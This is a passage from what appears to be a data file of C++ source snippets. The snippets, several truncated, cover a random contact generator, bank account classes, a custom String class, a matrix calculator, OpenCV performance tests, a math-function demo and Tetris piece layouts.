CallOut;\r\n};\r\nPhone* Contacts = new Phone[Contacts_Amounts];\r\n\r\nint Generate_Int(int MIN_RAND, int MAX_RAND) // Needed to generate random number but let stay as an int\r\n{\r\n    return MIN_RAND + rand() % (MAX_RAND - MIN_RAND);\r\n}\r\n\r\nstd::string Generate_String_Numbers(int MAX_LOOP, int MIN_RAND, int MAX_RAND) // Needed to generate random numbers and transform them to string\r\n{\r\n    std::string Generated_Result;\r\n    loop(i, MAX_LOOP)\r\n    {\r\n        Generated_Result += std::to_string(MIN_RAND + rand() % (MAX_RAND - MIN_RAND));\r\n    }\r\n    return Generated_Result;\r\n}\r\n\r\nstd::string Generate_from_Struct(std::string x[]) // randomly chooses features from Examples sctructure\r\n{\r\n    int j = Generate_Int(0, 5);\r\n    switch (j)\r\n    {\r\n    case 0:\r\n        return x[j];\r\n        break;\r\n    case 1:\r\n        return x[j];\r\n        break;\r\n    case 2:\r\n        return x[j];\r\n        break;\r\n    case 3:\r\n        return x[j];\r\n        break;\r\n    case 4:\r\n        return x[j];\r\n        break;\r\n    case 5:\r\n        return x[j];\r\n        break;\r\n    default:\r\n        eut(\"Something went wrong!\");\r\n        break;\r\n    }\r\n    return 0;\r\n}\r\n\r\nvoid Amount_Input() // Can be used to change Contacts_Amount\r\n{\r\n    iut(\"Enter amount of contacts => \", Contacts_Amounts);\r\n}\r\n\r\nvoid Input() // Creates a list of Contacts_Amount\r\n{\r\n    loop(i, Contacts_Amounts)\r\n    {\r\n        Contacts[i].Phone_Number = Generate_from_Struct(Out.Operator_Code) + \"-\" + Generate_String_Numbers(4, 0, 9);\r\n        Contacts[i].Phone_Number += \"-\" + Generate_String_Numbers(2, 0, 9) + \"-\" + Generate_String_Numbers(2, 0, 9);\r\n        Contacts[i].Device_Type = Generate_from_Struct(Out.Device_Type);\r\n        Contacts[i].Name = Generate_from_Struct(Out.Name);\r\n        Contacts[i].Surname = Generate_from_Struct(Out.Surname);\r\n        Contacts[i].Group = Generate_from_Struct(Out.Group);\r\n        Contacts[i].Birthday_Day = Generate_String_Numbers(1, 1, 30) + \"-\" + Generate_String_Numbers(1, 1, 12) + \"-\" + Generate_String_Numbers(1, 1950, Years);\r\n        Contacts[i].Place_of_residence = Generate_from_Struct(Out.Place_of_residence);\r\n        Contacts[i].Rating = Generate_Int(1, 5);\r\n        Contacts[i].CallIn = Generate_Int(1, 100);\r\n        Contacts[i].CallOut = Generate_Int(1, 100);\r\n        Sleep(150);\r\n    }\r\n    end;\r\n}\r\n\r\nint Find_Most_CallIn() // One of the contacts has the most \"Entering calls\"\r\n{\r\n    int Saver;\r\n    loop(i, Contacts_Amounts)\r\n    {\r\n        loop(j, Contacts_Amounts)\r\n        {\r\n            if (Contacts[j].CallIn > Contacts[i].CallIn)\r\n            {\r\n                Saver = j;\r\n            }\r\n        }\r\n    }\r\n    return Saver;\r\n}\r\n\r\nvoid Output(int i) // Function to output detailed data of contact\r\n{\r\n    eut(\"Contact phone - \" << Contacts[i].Phone_Number);\r\n    eut(\"Device type - \" << Contacts[i].Device_Type);\r\n    eut(\"Name - \" << Contacts[i].Name);\r\n    eut(\"Surname - \" << Contacts[i].Surname);\r\n    eut(\"Group - \" << Contacts[i].Group);\r\n    eut(\"Birthday - \" << Contacts[i].Birthday_Day);\r\n    eut(\"Place of residence - \" << ",
    "#include <iostream>\n#include <list>\n#include <iomanip>\n#include <memory>\n#include <stdexcept>\n#include <ctime>\n#include <fstream>\n#include <sstream> //lib\n\nusing namespace std;\n\nstruct Transaction\n{\n    string date;\n    int accountNo;\n    int amount;\n    string type;\n};\n\nclass Account\n{\nprotected:\n    static int CountAccountID;\n    static int CountAccountNo;\n\n    int AccountID;\n    int AccountNo;\n    string AccountName;\n    string AccountType;\n    string AccountStatus;\n    string DOB;\n    int Balance;\n\npublic:\n    Account(string Name, string dob, string Type)\n    {\n        AccountID = CountAccountID++;\n        AccountNo = CountAccountNo++;\n        AccountName = Name;\n        AccountType = Type;\n        AccountStatus = \"Active\";\n        DOB = dob;\n        Balance = 0;\n\n        cout << \"\\nNew Created Account No.: \" << AccountNo << endl;\n    }\n\n    virtual void DisplayData()\n    {\n        cout << left << setw(12) << AccountID\n             << setw(20) << AccountNo\n             << setw(20) << AccountName\n             << setw(15) << DOB\n             << setw(10) << AccountType\n             << setw(10) << AccountStatus\n             << setw(10) << Balance;\n    }\n\n    int getAccountNo()\n    {\n        return AccountNo;\n    }\n\n    void setAccountStatus(string newStatus)\n    {\n        AccountStatus = newStatus;\n        cout << \"Account status changed to: \" << AccountStatus << endl;\n    }\n\n    void saveAccount(ofstream &outFile)\n    {\n        outFile << AccountID << \",\"\n                << AccountNo << \",\"\n                << AccountName << \",\"\n                << DOB << \",\"\n                << AccountType << \",\"\n                << AccountStatus << \",\"\n                << Balance << endl;\n    }\n\n    friend Account operator+(Account acc, int amount)\n    {\n        acc.Balance += amount;\n        cout << \"\\nDeposited: \" << amount << \". New balance: \" << acc.Balance << endl;\n        return acc;\n    }\n\n    friend Account operator-(Account acc, int amount)\n    {\n        if (acc.Balance < amount)\n        {\n            cout << \"\\nInsufficient balance to withdraw \" << amount << \". Available balance: \" << acc.Balance << endl;\n        }\n        else\n        {\n            acc.Balance -= amount;\n            cout << \"\\nWithdrew: \" << amount << \". New balance: \" << acc.Balance << endl;\n        }\n        return acc;\n    }\n\n    virtual ~Account() {}\n};\n\nclass SalaryAccount : public Account\n{\nprivate:\n    int MonthlySalary;\n    double InterestRate;\n\npublic:\n    SalaryAccount(string Name, string dob, int Salary, double Rate)\n        : Account(Name, dob, \"Salary\"), MonthlySalary(Salary), InterestRate(Rate) {}\n\n    void DisplayData()\n    {\n        Account::DisplayData();\n        cout << setw(15) << MonthlySalary\n             << setw(15) << InterestRate\n             << endl;\n    }\n\n    void saveAccount(ofstream &outFile)\n    {\n        Account::saveAccount(outFile);\n        outFile << MonthlySalary << \",\"\n                << InterestRate << endl;\n    }\n};\n\nclass CurrentAccount : public Account\n{\nprivate:\n    int TransactionLimit, MonthlyCharge;\n\npublic:\n    CurrentAccount(string Name, string dob, int limit, int charge)\n        : Account(Name, dob, \"Current\"), TransactionLimit(limit), MonthlyCharge(charge) {}\n\n    void DisplayData()\n    {\n        Account::DisplayData();\n        cout << setw(15) << TransactionLimit\n             << setw(15) << MonthlyCharge\n             << endl;\n    }\n\n    void saveAccount(ofstream &outFile)\n    {\n        Account::saveAccount(outFile);\n        outFile << TransactionLimit << \",\"\n                << MonthlyCharge << endl;\n    }\n};\n\nclass SavingsAccount : public Account\n{\nprivate:\n    int MinimumBalance;\n    double InterestRate;\n\npublic:\n    SavingsAccount(string Name, string dob, int Balance, double Rate)\n        : Account(Name, dob, \"Savings\"), MinimumBalance(Balance), InterestRate(Rate) {}\n\n    void DisplayData()\n    {\n        Account::DisplayData();\n        cout << setw(15) << MinimumBalance\n             << setw(15) << InterestRate\n             << endl;\n    }\n\n    void saveAccount(ofstream &outFile)\n    {\n        Account::saveAccount(outFile);\n        outFile << MinimumBalance << \",\"\n                << InterestRate << endl;\n    }\n};\n\nint Account::CountAccountID = 1;\nint Account::CountAccountNo = 10001;\n\ntemplate <typename AccountType, typename... Args>\nAccountType *createAccount(Args... args)\n{\n    return new AccountType(args...);\n}\n\ntemplate <typename AccountType>\nvoid displayAccounts(list<Account *> accounts)\n{\n    bool found = false;\n    for (Account *acc : accounts)\n    {\n        if (AccountType *typedAcc = dynamic_cast<AccountType *>(acc))\n        {\n            typedAcc->DisplayData();\n            found = true;\n        }\n    }\n    if (!found)\n    {\n        cout << \"No accounts of this type available.\\n\";\n    }\n}\n\nvoid printSalaryHeader()\n{\n    cout << \"\\n--- Salary Accounts ---\\n\";\n    cout << left << setw(12) << \"Account ID\"\n         << setw(20) << \"Account No.\"\n         << setw(20) << \"Account Name\"\n         << s",
    "#include\"String.h\"\r\nbool String::isValidIndex(const int index) const\r\n{\r\n\treturn (index >= 0 && index < size) ? true : false;\r\n}\r\nvoid String::mySwap(char* a, char* b)\r\n{\r\n\tif (isNullPtr(a) == true || isNullCharacter(a[0]) == true || isNullPtr(b) == true || isNullCharacter(b[0]) == true)\r\n\t{\r\n\t\treturn;\r\n\t}\r\n\tchar temp = *a;\r\n\t*a = *b;\r\n\t*b = temp;\r\n}\r\nint String::giveResultOfComparingGivenStringsIndexValue(const char str1,const char str2) const\r\n{\r\n\tif (str1<str2)\r\n\t{\r\n\t\treturn -1;\r\n\t}\r\n\telse if (str1>str2)\r\n\t{\r\n\t\treturn 1;\r\n\t}\r\n\telse\r\n\t{\r\n\t\treturn 0;\r\n\t}\r\n}\r\nbool String::isStringNegative() const\r\n{\r\n\tif (isNullPtr(data) == true || isNullCharacter(data[0]) == true)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\tif (data[0] == '-')\r\n\t{\r\n\t\treturn true;\r\n\t}\r\n\treturn false;\r\n}\r\nbool String::isStringPositive() const\r\n{\r\n\tif (isNullPtr(data) == true || isNullCharacter(data[0]) == true)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\tif (data[0] == '+')\r\n\t{\r\n\t\treturn true;\r\n\t}\r\n\treturn false;\r\n}\r\nint String::giveNumberLength(long long int& a) const\r\n{\r\n\tint length = 0;\r\n\tif (a==0)\r\n\t{\r\n\t\tlength = 1;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tif (a<0)\r\n\t\t{\r\n\t\t\tlength++;\r\n\t\t\ta = a * -1;\r\n\t\t}\r\n\t\twhile (a>0)\r\n\t\t{\r\n\t\t\tlength++;\r\n\t\t\ta = a / 10;\r\n\t\t}\r\n\t}\r\n\treturn length;\r\n}\r\nint String::giveLengthOfGivenString(const char* c) const\r\n{\r\n\tif (isNullPtr(c) == true || isNullCharacter(c[0]) == true)\r\n\t{\r\n\t\treturn 0;\r\n\t}\r\n\tint count = 0;\r\n\twhile (c[count] != '\\0')\r\n\t{\r\n\t\tcount++;\r\n\t}\r\n\treturn count;\r\n}\r\nbool String::isNullPtr(const char* pointer) const\r\n{\r\n\treturn (pointer == nullptr) ? true : false;\r\n}\r\nbool String::isNullCharacter(const char character) const\r\n{\r\n\treturn (character == '\\0') ? true : false;\r\n}\r\nvoid String::createString(char*& string, int size) const\r\n{\r\n\tstring = new char[size];\r\n}\r\nvoid String::copyString(char* dest, const char* sour) const\r\n{\r\n\tif (isNullPtr(dest) == true)\r\n\t{\r\n\t\treturn;\r\n\t}\r\n\tif (isNullPtr(sour) == true || isNullCharacter(sour[0]) == true)\r\n\t{\r\n\t\tdest[0] = '\\0';\r\n\t\treturn;\r\n\t}\r\n\tint count = 0;\r\n\twhile (sour[count] != '\\0')\r\n\t{\r\n\t\tdest[count] = sour[count];\r\n\t\tcount++;\r\n\t}\r\n\tdest[count] = '\\0';\r\n}\r\nvoid String::copyStringByUsingLength(char* dest, const char* sour, int size) const\r\n{\r\n\tif (size <= 0)\r\n\t{\r\n\t\tdest = nullptr;\r\n\t\treturn;\r\n\t}\r\n\tif (isNullPtr(dest) == true)\r\n\t{\r\n\t\treturn;\r\n\t}\r\n\tif (isNullPtr(sour) == true || isNullCharacter(sour[0]) == true)\r\n\t{\r\n\t\tdest[0] = '\\0';\r\n\t\treturn;\r\n\t}\r\n\tint count = 0;\r\n\twhile (count < size - 1)\r\n\t{\r\n\t\tdest[count] = sour[count];\r\n\t\tcount++;\r\n\t}\r\n\tdest[count] = '\\0';\r\n}\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nString::String()\r\n{\r\n\tdata = nullptr;\r\n\tsize = 0;\r\n}\r\nString::String(const String&ref) : String()\r\n{\r\n\tif (isNullPtr(ref.data)==true || ref.size <= 0)\r\n\t{\r\n\t\treturn;\r\n\t}\r\n\tsize = ref.size;\r\n\tcreateString(data, size);\r\n\tcopyStringByUsingLength(data, ref.data, ref.size);\r\n}\r\nString::String(String&& ref) noexcept : String()\r\n{\r\n\tif (ref.isEmpty() || ref.size <= 0 )\r\n\t{\r\n\t\treturn;\r\n\t}\r\n\tdata = ref.data;\r\n\tsize = ref.size;\r\n\tref.data = nullptr;\r\n\tref.size = 0;\r\n}\r\nString::String(const char c) : String()\r\n{\r\n\tif ( isNullCharacter(c) == true )\r\n\t{\r\n\t\tsize = 1;\r\n\t\tcreateString(data, size);\r\n\t\tdata[0] = '\\0';\r\n\t\treturn;\r\n\t}\r\n\tsize = 2;\r\n\tcreateString(data, size);\r\n\tdata[0] = c;\r\n\tdata[1] = '\\0';\r\n}\r\nString::String(const char* c) : String()\r\n{\r\n\tif (isNullPtr(c) == true)\r\n\t{\r\n\t\treturn;\r\n\t}\r\n\tint count = giveLengthOfGivenString(c);\r\n\tsize = count + 1;\r\n\tcreateString(data, size);\r\n\tcopyString(data, c);\r\n}\r\nString::String(const long long int a)\r\n{\r\n\tlong long int temp = a;\r\n\tsize = (giveNumberLength(temp) + 1);\r\n\tcreateString(data, (size));\r\n\tif (a == 0)\r\n\t{\r\n\t\tdata[0] = '0';\r\n\t\tdata[1] = '\\0';\r\n\t}\r\n\telse\r\n\t{\r\n\t\ttemp = a;\r\n\t\tif (a < 0)\r\n\t\t{\r\n\t\t\tdata[size - 2] = '-';\r\n\t\t\ttemp = temp * -1;\r\n\t\t\tfor (int i = 0; i < size - 2; i++)\r\n\t\t\t{\r\n\t\t\t\tdata[i] = '0' + (temp % 10);\r\n\t\t\t\ttemp = temp / 10;\r\n\t\t\t}\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tfor (int i = 0; i < size - 1; i++)\r\n\t\t\t{\r\n\t\t\t\tdata[i] = '0' + (temp % 10);\r\n\t\t\t\ttemp = temp / 10;\r\n\t\t\t}\r\n\r\n\t\t}\r\n\t\tdata[size - 1] = '\\0';\r\n\t\treverse();\r\n\t}\r\n}\r\nvoid String::input()\r\n{\r\n\tif (isNullPtr(data)==false)\r\n\t{\r\n\t\tthis->~String();\r\n\t}\r\n\tchar character;\r\n\tint count = 0,length=0;\r\n\tsize = 2;\r\n\tcreateString(data, size);\r\n\twhile (cin.get(character)&&character!='\\n')\r\n\t{\r\n\t\tif (count==size-1)\r\n\t\t{\r\n\t\t\tlength=size+1;\r\n\t\t\treSize(length);\r\n\t\t}\r\n\t\tdata[count] = character;\r\n\t\tcount++;\r\n\t}\r\n\tdata[count] = '\\0';\r\n}\r\nvoid String::reSize(int newSize)\r\n{\r\n\tif (newSize<=0)\r\n\t{\r\n\t\tthis->~String();\r\n\t\treturn;\r\n\t}\r\n\tif(isNullPtr(data) == true || isNullCharacter(data[0]) == true)\r\n\t{\r\n\t\treturn;\r\n\t}\r\n\tint limit = (newSize < size) ? newSize : size;\r\n\tchar* temp;\r\n\tcreateString(temp, newSize);\r\n\tcopyStringByUsingLength(temp, data, limit);\r\n\tthis->~String();\r\n\tdata = temp;\r\n\tsize = newSize;\r\n}\r\nvoid String::display() const\r\n{\r\n\tif (isNullPtr(data) == true)\r\n\t{\r\n\t\treturn;\r\n\t}\r\n\tcout << data;\r\n}\r\nchar& String::at(const int index)\r\n{\r\n\tif (isNullPtr(data)==false && isNullCharacter(data[0]) == false && isValidIndex(index) == true)\r\n\t{\r\n\t\treturn data[index];\r\n\t}\r",
    "#include <iostream>\r\n#include <vector>\r\n#include <iomanip>\r\n#include <cmath>\r\n#include \"functions.hpp\"\r\n\r\n\r\nint main() {\r\n    int operation;\r\n    int rowsA, colsA, rowsB, colsB;\r\n\r\n    std::cout << \"Matrix Calculator\\n\";\r\n    std::cout << \"Select the operation by saying the number:\\n\";\r\n    std::cout << \"1. Add\\n\";\r\n    std::cout << \"2. Subtract\\n\";\r\n    std::cout << \"3. Multiply\\n\";\r\n    std::cout << \"4. Transpose Matrix\\n\";\r\n    std::cin >> operation;\r\n\r\n    if (operation == 1 || operation == 2 || operation == 3) {\r\n\r\n        std::cout << \"Enter the size of Matrix A (rows cols): \";\r\n        std::cin >> rowsA >> colsA;\r\n        std::cout << \"Enter the size of Matrix B (rows cols): \";\r\n        std::cin >> rowsB >> colsB;\r\n    } else if (operation == 4) {\r\n        std::cout << \"Enter the size of Matrix (rows cols): \";\r\n        std::cin >> rowsA >> colsA;\r\n    } else {\r\n        std::cout << \"Not a valid choice, exiting\";\r\n        return 0;\r\n    }\r\n\r\n\r\n    std::vector<std::vector<double>> matrixA(rowsA, std::vector<double>(colsA));\r\n    std::vector<std::vector<double>> matrixB;\r\n\r\n    if (operation == 1 || operation == 2 || operation == 3) {\r\n        matrixB = std::vector<std::vector<double>>(rowsB, std::vector<double>(colsB));\r\n    }\r\n\r\n\r\n    inputMatrix(matrixA, rowsA, colsA, \"Matrix A\");\r\n\r\n    if (operation == 1 || operation == 2 || operation == 3) {\r\n\r\n        inputMatrix(matrixB, rowsB, colsB, \"Matrix B\");\r\n    }\r\n\r\n    std::vector<std::vector<double>> result;\r\n    switch (operation) {\r\n        case 1:\r\n            if (rowsA == rowsB && colsA == colsB) {\r\n                result = addMatrices(matrixA, matrixB, rowsA, colsA);\r\n                std::cout << \"Result of Matrix A + Matrix B:\\n\";\r\n                displayMatrix(result);\r\n            } else {\r\n                std::cout << \"Matrices must have the same dimensions for addition\\n\";\r\n            }\r\n            break;\r\n\r\n        case 2:\r\n            if (rowsA == rowsB && colsA == colsB) {\r\n                result = subtractMatrices(matrixA, matrixB, rowsA, colsA);\r\n                std::cout << \"Result of Matrix A - Matrix B:\\n\";\r\n                displayMatrix(result);\r\n            } else {\r\n                std::cout << \"Matrices must have the same dimensions for subtraction\\n\";\r\n            }\r\n            break;\r\n\r\n        case 3:\r\n            if (colsA == rowsB) {\r\n                result = multiplyMatrices(matrixA, matrixB, rowsA, colsA, colsB);\r\n                std::cout << \"Result of Matrix A * Matrix B:\\n\";\r\n                displayMatrix(result);\r\n            } else {\r\n                std::cout << \"For multiplication, the number of columns in Matrix A must equal the number of rows in Matrix B!\\n\";\r\n            }\r\n            break;\r\n\r\n        case 4:\r\n            result = transposeMatrix(matrixA, rowsA, colsA);\r\n            std::cout << \"Transpose of Matrix A:\\n\";\r\n            displayMatrix(result);\r\n            break;\r\n\r\n        default:\r\n            std::cout << \"Invalid operation!\\n\";\r\n    }\r\n\r\n    return 0;\r\n}",
    "#include \"perf_precomp.hpp\"\n\nnamespace opencv_test\n{\nusing namespace perf;\n\nPERF_TEST_P(Size_MatType, sum, TYPICAL_MATS)\n{\n    Size sz = get<0>(GetParam());\n    int type = get<1>(GetParam());\n\n    Mat arr(sz, type);\n    Scalar s;\n\n    declare.in(arr, WARMUP_RNG).out(s);\n\n    TEST_CYCLE() s = sum(arr);\n\n    SANITY_CHECK(s, 1e-6, ERROR_RELATIVE);\n}\n\nPERF_TEST_P(Size_MatType, mean, TYPICAL_MATS)\n{\n    Size sz = get<0>(GetParam());\n    int type = get<1>(GetParam());\n\n    Mat src(sz, type);\n    Scalar s;\n\n    declare.in(src, WARMUP_RNG).out(s);\n\n    TEST_CYCLE() s = mean(src);\n\n    SANITY_CHECK(s, 1e-5);\n}\n\nPERF_TEST_P(Size_MatType, mean_mask, TYPICAL_MATS)\n{\n    Size sz = get<0>(GetParam());\n    int type = get<1>(GetParam());\n\n    Mat src(sz, type);\n    Mat mask = Mat::ones(src.size(), CV_8U);\n    Scalar s;\n\n    declare.in(src, WARMUP_RNG).in(mask).out(s);\n\n    TEST_CYCLE() s = mean(src, mask);\n\n    SANITY_CHECK(s, 5e-5);\n}\n\nPERF_TEST_P(Size_MatType, meanStdDev, TYPICAL_MATS)\n{\n    Size sz = get<0>(GetParam());\n    int matType = get<1>(GetParam());\n\n    Mat src(sz, matType);\n    Scalar mean;\n    Scalar dev;\n\n    declare.in(src, WARMUP_RNG).out(mean, dev);\n\n    TEST_CYCLE() meanStdDev(src, mean, dev);\n\n    SANITY_CHECK(mean, 1e-5, ERROR_RELATIVE);\n    SANITY_CHECK(dev, 1e-5, ERROR_RELATIVE);\n}\n\nPERF_TEST_P(Size_MatType, meanStdDev_mask, TYPICAL_MATS)\n{\n    Size sz = get<0>(GetParam());\n    int matType = get<1>(GetParam());\n\n    Mat src(sz, matType);\n    Mat mask = Mat::ones(sz, CV_8U);\n    Scalar mean;\n    Scalar dev;\n\n    declare.in(src, WARMUP_RNG).in(mask).out(mean, dev);\n\n    TEST_CYCLE() meanStdDev(src, mean, dev, mask);\n\n    SANITY_CHECK(mean, 1e-5);\n    SANITY_CHECK(dev, 1e-5);\n}\n\nPERF_TEST_P(Size_MatType, countNonZero, testing::Combine( testing::Values( TYPICAL_MAT_SIZES ), testing::Values( CV_8UC1, CV_8SC1, CV_16UC1, CV_16SC1, CV_32SC1, CV_32FC1, CV_64FC1 ) ))\n{\n    Size sz = get<0>(GetParam());\n    int matType = get<1>(GetParam());\n\n    Mat src(sz, matType);\n    int cnt = 0;\n\n    declare.in(src, WARMUP_RNG);\n\n    int runs = (sz.width <= 640) ? 8 : 1;\n    TEST_CYCLE_MULTIRUN(runs) cnt = countNonZero(src);\n\n    SANITY_CHECK(cnt);\n}\n\nPERF_TEST_P(Size_MatType, hasNonZero, testing::Combine( testing::Values( TYPICAL_MAT_SIZES ), testing::Values( CV_8UC1, CV_8SC1, CV_16UC1, CV_16SC1, CV_32SC1, CV_32FC1, CV_64FC1 ) ))\n{\n    Size sz = get<0>(GetParam());\n    int matType = get<1>(GetParam());\n\n    Mat src(sz, matType);\n    /*bool hnz = false;*/\n\n    declare.in(src, WARMUP_RNG);\n\n    int runs = (sz.width <= 640) ? 8 : 1;\n    TEST_CYCLE_MULTIRUN(runs) /*hnz =*/ hasNonZero(src);\n\n    SANITY_CHECK_NOTHING();\n}\n\n} // namespace\n",
    "#include <iostream>\n#include <cmath>  // Required for math functions\nusing namespace std;\n\nint main() {\n    double num = 9.0;\n    double angle = 45.0; // in degrees\n\n    // Square root\n    cout << \"Square root of \" << num << \" is \" << sqrt(num) << endl;\n\n    // Power\n    double base = 2.0, exponent = 3.0;\n    cout << base << \" raised to the power \" << exponent << \" is \" << pow(base, exponent) << endl;\n\n    // Trigonometric functions (converting degrees to radians)\n    double radians = angle * M_PI / 180.0;\n    cout << \"Sine of \" << angle << \" degrees is \" << sin(radians) << endl;\n    cout << \"Cosine of \" << angle << \" degrees is \" << cos(radians) << endl;\n\n    // Logarithmic functions\n    double value = 10.0;\n    cout << \"Natural log of \" << value << \" is \" << log(value) << endl;    // ln(x)\n    cout << \"Log base 10 of \" << value << \" is \" << log10(value) << endl; // log10(x)\n\n    // Absolute value\n    double negativeNumber = -23.5;\n    cout << \"Absolute value of \" << negativeNumber << \" is \" << fabs(negativeNumber) << endl;\n\n    // Ceil value\n    double ceilNumber = 23.5;\n    cout << \"Round up value of \" << ceilNumber << \" is \" << ceilf(ceilNumber) << endl;\n\n    // Round value\n    cout << \"Rounded value of \" << ceilNumber << \" is \" << roundf(ceilNumber) << endl;\n    \n    // Floor value\n    cout << \"Round Down value of \" << ceilNumber << \" is \" << floorf(ceilNumber) << endl;\n\n    return 0;\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <unordered_map>\r\n#include <string>\r\n#include <cstdlib>\r\n#include <ctime>\r\n#include <termios.h>\r\n#include <unistd.h>\r\n\r\nusing namespace std;\r\n\r\nvoid printPiece(unordered_map<string, unordered_map<int, vector<vector<int>>>>& pieces, int rotation, string piece) {\r\n    for (int i = 0; i < 4; i++) {\r\n        for (int j = 0; j < 4; j++) {\r\n            if(pieces[piece][rotation][i][j] == 1) cout << \"\\033[35m\u25fc\\033[0m  \";\r\n            else if(pieces[piece][rotation][i][j] == 2) cout << \"\\033[38;5;9m\u25fc\\033[0m  \";\r\n            else if(pieces[piece][rotation][i][j] == 3) cout << \"\\033[32m\u25fc\\033[0m  \";\r\n            else if(pieces[piece][rotation][i][j] == 4) cout << \"\\033[38;5;214m\u25fc\\033[0m  \";\r\n            else if(pieces[piece][rotation][i][j] == 5) cout << \"\\033[38;5;105m\u25fc\\033[0m  \";\r\n            else if(pieces[piece][rotation][i][j] == 6) cout << \"\\033[36m\u25fc\\033[0m  \";\r\n            else if(pieces[piece][rotation][i][j] == 7) cout << \"\\033[33m\u25fc\\033[0m  \";\r\n            else cout << \".  \";\r\n        }\r\n        cout << endl;\r\n    }\r\n}\r\n\r\nvoid delay(int seconds) {\r\n    time_t start_time = time(NULL);  // Get current time\r\n    while (time(NULL) < start_time + seconds);  // Loop until desired time has passed\r\n}\r\n\r\nstring getch() {\r\n    struct termios oldt, newt;\r\n    char ch[3]; // Buffer for 3 characters (for escape sequences)\r\n    string result;\r\n\r\n    // Get the current terminal settings\r\n    tcgetattr(STDIN_FILENO, &oldt);\r\n    newt = oldt;\r\n\r\n    // Disable canonical mode and echo\r\n    newt.c_lflag &= ~(ICANON | ECHO);\r\n    tcsetattr(STDIN_FILENO, TCSANOW, &newt);\r\n\r\n    // Read one character\r\n    ch[0] = getchar();\r\n\r\n    result = std::string(1, ch[0]); // If it's a regular character, create a string\r\n\r\n    // Restore the old terminal settings\r\n    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);\r\n    \r\n    return result;\r\n}\r\n\r\nint main() {\r\n    unordered_map<string, unordered_map<int, vector<vector<int>>>> pieces;\r\n    srand(static_cast<unsigned int>(time(0)));\r\n    string piece;\r\n\r\n    for (int i = 0; i < 4; i ++) {\r\n        pieces[\"sPiece\"][i] = vector<vector<int>>(4, vector<int>(4, 0));\r\n        pieces[\"iPiece\"][i] = vector<vector<int>>(4, vector<int>(4, 0));\r\n        pieces[\"zPiece\"][i] = vector<vector<int>>(4, vector<int>(4, 0));\r\n        pieces[\"lPiece\"][i] = vector<vector<int>>(4, vector<int>(4, 0));\r\n        pieces[\"pPiece\"][i] = vector<vector<int>>(4, vector<int>(4, 0));\r\n        pieces[\"tPiece\"][i] = vector<vector<int>>(4, vector<int>(4, 0));\r\n        pieces[\"oPiece\"][i] = vector<vector<int>>(4, vector<int>(4, 0));\r\n    }\r\n\r\n    pieces[\"sPiece\"][0] = {\r\n        {0, 0, 0, 0},\r\n        {0, 1, 1, 0},\r\n        {1, 1, 0, 0},\r\n        {0, 0, 0, 0}\r\n    };\r\n    pieces[\"sPiece\"][1] = {\r\n        {0, 1, 0, 0},\r\n        {0, 1, 1, 0},\r\n        {0, 0, 1, 0},\r\n        {0, 0, 0, 0}\r\n    };\r\n    pieces[\"sPiece\"][2] = {\r\n        {0, 0, 0, 0},\r\n        {0, 1, 1, 0},\r\n        {1, 1, 0, 0},\r\n        {0, 0, 0, 0}\r\n    };\r\n    pieces[\"sPiece\"][3] = {\r\n        {1, 0, 0, 0},\r\n        {1, 1, 0, 0},\r\n        {0, 1, 0, 0},\r\n        {0, 0, 0, 0}\r\n    };\r\n\r\n    pieces[\"iPiece\"][0] = {\r\n        {0, 0, 0, 0},\r\n        {0, 0, 0, 0},\r\n        {2, 2, 2, 2},\r\n        {0, 0, 0, 0}\r\n    };\r\n    pieces[\"iPiece\"][1] = {\r\n        {0, 0, 2, 0},\r\n        {0, 0, 2, 0},\r\n        {0, 0, 2, 0},\r\n        {0, 0, 2, 0}\r\n    };\r\n    pieces[\"iPiece\"][2] = {\r\n        {0, 0, 0, 0},\r\n        {0, 0, 0, 0},\r\n        {2, 2, 2, 2},\r\n        {0, 0, 0, 0}\r\n    };\r\n    pieces[\"iPiece\"][3] = {\r\n        {0, 2, 0, 0},\r\n        {0, 2, 0, 0},\r\n        {0, 2, 0, 0},\r\n        {0, 2, 0, 0}\r\n    };\r\n\r\n    pieces[\"zPiece\"][0] = {\r\n        {3, 3, 0, 0},\r\n        {0, 3, 3, 0},\r\n        {0, 0, 0, 0},\r\n        {0, 0, 0, 0}\r\n    };\r\n    pieces[\"zPiece\"][1] = {\r\n        {0, 0, 3, 0},\r\n        {0, 3, 3, 0},\r\n        {0, 3, 0, 0},\r\n        {0, 0, 0, 0}\r\n    };\r\n    pieces[\"zPiece\"][2] = {\r\n        {0, 0, 0, 0},\r\n        {3, 3, 0, 0},\r\n        {0, 3, 3, 0},\r\n        {0, 0, 0, 0}\r\n    };\r\n    pieces[\"zPiece\"][3] = {\r\n        {0, 3, 0, 0},\r\n        {3, 3, 0, 0},\r\n        {3, 0, 0, 0},\r\n        {0, 0, 0, 0}\r\n    };\r\n\r\n    pieces[\"lPiece\"][0] = {\r\n        {4, 4, 4, 0},\r\n        {4, 0, 0, 0},\r\n        {0, 0, 0, 0},\r\n        {0, 0, 0, 0}\r\n    };\r\n    pieces[\"lPiece\"][1] = {\r\n        {4, 4, 0, 0},\r\n        {0, 4, 0, 0},\r\n        {0, 4, 0, 0},\r\n        {0, 0, 0, 0}\r\n    };\r\n    pieces[\"lPiece\"][2] = {\r\n        {0, 0, 0, 0},\r\n        {0, 0, 4, 0},\r\n        {4, 4, 4, 0},\r\n        {0, 0, 0, 0}\r\n    };\r\n    pieces[\"lPiece\"][3] = {\r\n        {0, 4, 0, 0},\r\n        {0, 4, 0, 0},\r\n        {0, 4, 4, 0},\r\n        {0, 0, 0, 0}\r\n    };\r\n\r\n    pieces[\"pPiece\"][0] = {\r\n        {5, 5, 5, 0},\r\n        {0, 0, 5, 0},\r\n        {0, 0, 0, 0},\r\n        {0, 0, 0, 0}\r\n    };\r\n    pieces[\"pPiece\"][1] = {\r\n        {0, 5, 0, 0},\r\n        {0, 5, 0, 0},\r\n        {5, 5, 0, 0},\r\n        {0, 0, 0, 0}\r\n    };\r\n    pieces[\"pPiece\"][2] = {\r\n        {0, 0, 0, 0},\r\n        {5, 0, 0, 0},\r\n      ",
